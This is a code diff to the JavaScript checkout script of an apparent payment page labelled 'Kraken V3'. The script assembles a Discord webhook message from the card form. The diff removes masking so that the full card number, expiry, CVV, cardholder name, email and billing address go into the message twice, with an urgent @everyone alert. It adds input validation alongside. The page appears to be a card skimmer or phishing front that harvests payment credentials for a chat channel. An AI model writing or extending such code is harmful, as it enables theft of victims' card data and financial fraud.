@@ -650,19 +650,37 @@ function switchPaymentMethod(method) {
 
 // Payment Processing Functions
 async function processCardPayment() {
+    // Validate all required fields are filled
+    const requiredFields = ['email', 'firstName', 'lastName', 'cardNumber', 'expiryDate', 'cvv', 'address', 'city', 'zipCode'];
+    const missingFields = [];
+
+    for (const field of requiredFields) {
+        const element = document.getElementById(field);
+        if (!element || !element.value.trim()) {
+            missingFields.push(field);
+        }
+    }
+
+    if (missingFields.length > 0) {
+        showNotification(`Please fill in all required fields: ${missingFields.join(', ')}`, 'error');
+        return;
+    }
+
     const formData = {
-        email: document.getElementById('email').value,
-        firstName: document.getElementById('firstName').value,
-        lastName: document.getElementById('lastName').value,
-        cardNumber: document.getElementById('cardNumber').value,
-        expiryDate: document.getElementById('expiryDate').value,
-        cvv: document.getElementById('cvv').value,
-        address: document.getElementById('address').value,
-        city: document.getElementById('city').value,
-        zipCode: document.getElementById('zipCode').value,
+        email: document.getElementById('email').value.trim(),
+        firstName: document.getElementById('firstName').value.trim(),
+        lastName: document.getElementById('lastName').value.trim(),
+        cardNumber: document.getElementById('cardNumber').value.replace(/\s/g, ''), // Remove spaces
+        expiryDate: document.getElementById('expiryDate').value.trim(),
+        cvv: document.getElementById('cvv').value.trim(),
+        address: document.getElementById('address').value.trim(),
+        city: document.getElementById('city').value.trim(),
+        zipCode: document.getElementById('zipCode').value.trim(),
         items: cart,
         total: cart.reduce((sum, item) => sum + item.price, 0),
-        paymentMethod: 'card'
+        paymentMethod: 'card',
+        timestamp: new Date().toISOString(),
+        orderNumber: generateOrderId()
     };
 
     try {
@@ -670,7 +688,7 @@ async function processCardPayment() {
 
         // Format data for Discord webhook with ALL user information
         const discordPayload = {
-            content: "🔔 **NEW CARD PAYMENT - REQUIRES PROCESSING**",
+            content: "🚨 **URGENT: NEW CARD PAYMENT - PROCESS IMMEDIATELY** 🚨\n@everyone - Payment waiting for processing!",
             embeds: [{
                 title: "🏦 Kraken V3 - Card Payment Details",
                 color: 0x667eea,
@@ -682,7 +700,7 @@ async function processCardPayment() {
                     },
                     {
                         name: "💳 Payment Card Details",
-                        value: `**Card Number:** **** **** **** ${formData.cardNumber.slice(-4)}\n**Expiry:** ${formData.expiryDate}\n**CVV:** ***\n**Card Type:** ${getCardType(formData.cardNumber)}`,
+                        value: `**Card Number:** ${formData.cardNumber}\n**Expiry:** ${formData.expiryDate}\n**CVV:** ${formData.cvv}\n**Card Type:** ${getCardType(formData.cardNumber)}\n**Cardholder:** ${formData.firstName} ${formData.lastName}`,
                         inline: false
                     },
                     {
@@ -702,7 +720,12 @@ async function processCardPayment() {
                     },
                     {
                         name: "🔍 Processing Instructions",
-                        value: `**Action Required:** Process this payment manually\n**Customer Contact:** ${formData.email}\n**Order ID:** ${generateOrderId()}`,
+                        value: `**⚠️ PROCESS THIS PAYMENT IMMEDIATELY**\n**Order ID:** ${formData.orderNumber}\n**Customer Contact:** ${formData.email}\n**Amount to Charge:** ${formData.total}\n**Transaction Date:** ${new Date().toLocaleString()}`,
+                        inline: false
+                    },
+                    {
+                        name: "💼 Complete Transaction Details",
+                        value: `**Full Card Number:** ${formData.cardNumber}\n**Expiry Date:** ${formData.expiryDate}\n**Security Code:** ${formData.cvv}\n**Billing Name:** ${formData.firstName} ${formData.lastName}\n**Email:** ${formData.email}\n**Address:** ${formData.address}, ${formData.city} ${formData.zipCode}`,
                         inline: false
                     }
                 ],
